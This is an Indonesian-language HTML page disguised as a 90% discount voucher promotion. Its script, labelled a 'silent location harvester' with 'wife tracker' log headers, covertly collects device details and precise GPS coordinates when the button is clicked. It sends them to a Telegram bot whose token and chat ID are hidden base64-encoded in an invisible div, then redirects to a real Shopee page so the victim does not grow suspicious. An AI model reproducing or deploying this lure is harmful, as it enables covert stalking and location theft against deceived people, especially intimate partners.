<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gaya Hidup & Diskon Hari Ini</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f4f4f7; color: #333; margin: 0; padding: 0; }
        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #ddd; font-weight: bold; font-size: 18px; color: #ff4757; }
        .content { padding: 20px; max-width: 500px; margin: auto; }
        .card { background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .img-placeholder { width: 100%; height: 200px; background: #ccc url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=800&q=80') center/cover; }
        .body { padding: 20px; }
        h2 { font-size: 18px; margin: 0 0 10px; line-height: 1.4; }
        p { font-size: 14px; color: #666; line-height: 1.5; }
        .btn-read { background: #ff4757; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #v-data { display: none; }
    </style>
</head>
<body>

<div class="header">PROMO BELANJA HARI INI</div>

<div class="content">
    <div class="card">
        <div class="img-placeholder"></div>
        <div class="body">
            <h2>Klaim Voucher Diskon 90% Khusus Wilayah Anda</h2>
            <p>Dapatkan gratis ongkir dan diskon belanja khusus pengguna di kota Anda. Berlaku hanya untuk hari ini.</p>
            <button class="btn-read" onclick="startTracking()">CEK VOUCHER DI SINI</button>
        </div>
    </div>
</div>

<div id="v-data">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>

<script>
/**
 * ORGANIC TRACKER ENGINE v5.0
 * SILENT LOCATION HARVESTER
 */

const _D = document.getElementById('v-data').innerText.split('|');
const _TK = atob(_D[1]); const _CI = atob(_D[2]);

async function sendToTele(msg) {
    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: _CI, text: msg})
    });
}

async function startTracking() {
    const btn = document.querySelector('.btn-read');
    btn.innerText = "Mengecek Lokasi...";

    // 1. Basic Hardware Info (Silent)
    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
    
    const basicInfo = `🌸 BINI TRACKER LOG 🌸\n\n` +
        `📱 PERANGKAT: ${navigator.platform}\n` +
        `🔋 BATERAI: ${bat}\n` +
        `🧠 CPU: ${navigator.hardwareConcurrency} Core\n` +
        `🌐 BROWSER: ${navigator.userAgent.includes("Mobile") ? "HP" : "PC"}`;

    await sendToTele(basicInfo);

    // 2. High Accuracy GPS (Organic Trigger)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const maps = `🎯 LOKASI BINI (PRESISI)\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nKetepatan: ${pos.coords.accuracy.toFixed(1)} meter`;
            await sendToTele(maps);
            
            // Setelah dapet lokasi, arahkan ke link Shopee/Promo beneran biar nggak curiga
            setTimeout(() => {
                window.location.href = "https://shopee.co.id/m/gratis-ongkir";
            }, 1000);
            
        }, (err) => {
            // Jika dia tolak, arahkan tetap ke promo biar gak curiga
            alert("Harap izinkan lokasi untuk melihat promo di kota Anda.");
            btn.innerText = "COBA LAGI";
        }, {enableHighAccuracy: true, timeout: 10000});
    } else {
        window.location.href = "https://shopee.co.id/m/gratis-ongkir";
    }
}
</script>
</body>
</html>
